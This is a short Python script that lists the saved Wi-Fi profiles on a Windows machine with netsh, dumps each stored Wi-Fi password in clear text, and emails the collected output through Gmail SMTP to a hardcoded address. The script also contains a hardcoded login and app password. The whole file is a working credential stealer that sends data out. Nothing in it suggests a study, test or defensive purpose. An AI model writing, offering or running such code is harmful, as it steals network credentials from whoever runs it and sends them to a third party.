import subprocess
import re
import time
import smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)

try:
    networks = networks.decode('utf-8')
except UnicodeDecodeError:
    networks = networks.decode('latin-1')  # Try decoding using Latin-1 if utf-8 fails

network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)

    try:
        current_result = current_result.decode('utf-8')
    except UnicodeDecodeError:
        current_result = current_result.decode('latin-1')  # Try decoding using Latin-1 if utf-8 fails

    result = result + current_result

send_mail("ruymhdi1@gmail.com", "bojvzyzbyvhheuxg", result)
